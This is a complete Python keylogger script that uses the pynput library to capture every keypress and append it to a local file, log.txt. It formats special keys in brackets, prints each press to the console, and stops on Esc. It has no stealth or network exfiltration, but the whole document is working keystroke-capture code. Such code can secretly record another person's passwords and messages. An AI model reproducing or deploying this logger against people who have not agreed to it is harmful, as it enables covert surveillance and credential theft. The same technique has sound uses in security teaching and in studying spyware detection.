#!/usr/bin/env python3

from pynput.keyboard import Key, Listener

keys = []


def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))


def write_file(keys):
    # 'a' mode opens the file for appending
    with open('log.txt', 'a') as f:
        for key in keys:
            # Removing '' from the key string
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                # Adding new line for readability
                f.write('\n')
            elif k.find("key") == -1:
                f.write(k)
            else:
                # Special keys in square brackets
                f.write(f'[{k}]')
            # Adding a space after each key for readability
            f.write(' ')
        keys.clear()  # Clearing the keys list after writing to the file


def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop listener
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
